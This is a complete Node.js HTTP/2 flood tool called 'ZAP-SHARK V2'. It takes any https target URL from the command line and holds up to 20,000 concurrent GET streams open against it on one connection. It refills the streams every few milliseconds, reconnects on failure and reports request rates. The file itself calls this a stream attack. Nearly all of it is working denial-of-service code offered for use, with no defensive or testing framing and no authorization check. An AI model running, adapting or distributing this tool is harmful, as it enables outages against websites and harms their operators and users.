const http2 = require('http2');

class ZAPSHARK_V2_PURE {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // MAX POWER SETTINGS
        this.client = null;
        this.maxStreams = 20000; // MAX WIFI STREAMS
        this.activeStreams = 0;
        this.streamQueue = [];
        
        // PERFORMANCE TRACKING
        this.peakRPS = 0;
        this.lastStreamCreation = Date.now();
        
        this.attackInterval = null;
    }

    // === MAX H2 CONNECTION ===
    connect() {
        try {
            console.log('[+] Creating MAX H2 connection...');
            
            this.client = http2.connect(this.targetUrl, {
                maxSessionMemory: 131072, // 128MB FOR MAX STREAMS
                maxDeflateDynamicTableSize: 4294967295,
                peerMaxConcurrentStreams: 20000,
                createConnection: () => {
                    // FORCE TCP NO DELAY FOR MAX SPEED
                    const socket = require('net').createConnection({
                        host: this.hostname,
                        port: 443,
                        noDelay: true,
                        keepAlive: true,
                        keepAliveInitialDelay: 0
                    });
                    const tls = require('tls').connect({
                        socket: socket,
                        servername: this.hostname,
                        ALPNProtocols: ['h2']
                    });
                    return tls;
                }
            });
            
            this.client.setMaxListeners(20000);
            
            // MAXIMUM SETTINGS
            this.client.settings({
                enablePush: false,
                initialWindowSize: 16777215, // MAX WINDOW
                maxConcurrentStreams: 20000
            });
            
            this.client.on('error', (err) => {
                console.log('[-] Connection error, reconnecting...');
                setTimeout(() => this.connect(), 1000);
            });
            
            this.client.on('remoteSettings', (settings) => {
                console.log(`[+] Server max streams: ${settings.maxConcurrentStreams || 'unknown'}`);
            });
            
            console.log('[+] MAX H2 connection ready for 20k streams');
            return true;
            
        } catch (err) {
            console.log('[-] Connection failed:', err.message);
            setTimeout(() => this.connect(), 2000);
            return false;
        }
    }

    // === CREATE MAX STREAMS ===
    createStreams() {
        if (!this.client || this.activeStreams >= this.maxStreams) return;
        
        const streamsToCreate = Math.min(100, this.maxStreams - this.activeStreams);
        
        for (let i = 0; i < streamsToCreate; i++) {
            try {
                this.activeStreams++;
                
                const req = this.client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.hostname
                });
                
                // ULTRA MINIMAL HANDLING FOR MAX SPEED
                req.on('response', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    this.activeStreams--;
                    
                    // INSTANTLY CREATE NEW STREAM
                    setTimeout(() => this.createStreams(), 0);
                });
                
                req.on('error', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    this.activeStreams--;
                    
                    // INSTANTLY CREATE NEW STREAM
                    setTimeout(() => this.createStreams(), 0);
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                // CONTINUE TRYING
            }
        }
        
        this.lastStreamCreation = Date.now();
    }

    // === KEEP MAX STREAMS ACTIVE ===
    maintainMaxStreams() {
        const now = Date.now();
        
        // IF STREAMS DROP BELOW 80%, REFILL
        if (this.activeStreams < this.maxStreams * 0.8) {
            const needed = this.maxStreams - this.activeStreams;
            const toCreate = Math.min(500, needed);
            
            for (let i = 0; i < toCreate; i++) {
                setTimeout(() => this.createStreams(), i * 0.1);
            }
        }
        
        // FORCE RECONNECT IF STUCK
        if (now - this.lastStreamCreation > 1000 && this.activeStreams === 0) {
            console.log('[!] Streams stuck, reconnecting...');
            if (this.client) {
                try { this.client.destroy(); } catch (e) {}
                this.client = null;
            }
            this.connect();
        }
    }

    // === RPS CALCULATION ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) { // UPDATE EVERY 0.9s
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    // === DISPLAY ===
    updateDisplay() {
        this.calculateRPS();
        
        // OVERWRITE ONLY - NO SPAM
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK V2 | 20K STREAMS ===');
        console.log('Streams: 20,000 max');
        console.log('Strategy: Single H2, Max multiplexing');
        console.log('='.repeat(40));
        
        this.connect();
        
        setTimeout(() => {
            if (!this.client) {
                console.log('[-] Failed to establish connection');
                return;
            }
            
            console.log('[+] Starting 20K stream attack...');
            
            // INITIAL STREAM CREATION
            this.createStreams();
            
            // MAINTAIN MAX STREAMS
            this.attackInterval = setInterval(() => {
                this.maintainMaxStreams();
                this.updateDisplay();
            }, 10); // CHECK EVERY 10ms
            
            // RAPID STREAM REFILL
            setInterval(() => {
                if (this.client && this.activeStreams < this.maxStreams * 0.9) {
                    this.createStreams();
                }
            }, 5); // REFILL EVERY 5ms
            
        }, 3000);
        
        process.on('SIGINT', () => {
            const runtime = (Date.now() - this.startTime) / 1000;
            const avgRPS = this.totalRequests / runtime;
            
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
            console.log(`Average RPS: ${avgRPS.toFixed(1)}`);
            console.log(`Active Streams: ${this.activeStreams}`);
            console.log(`Runtime: ${runtime.toFixed(1)}s`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.attackInterval);
            
            if (this.client) {
                try { this.client.destroy(); } catch (e) {}
            }
            
            process.exit(0);
        });
    }
}

// USAGE WITH MAX PERFORMANCE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

// MAXIMIZE SYSTEM LIMITS
process.env.UV_THREADPOOL_SIZE = 128;
process.env.NODE_OPTIONS = '--max-old-space-size=4096';

const shark = new ZAPSHARK_V2_PURE(target);
shark.start();
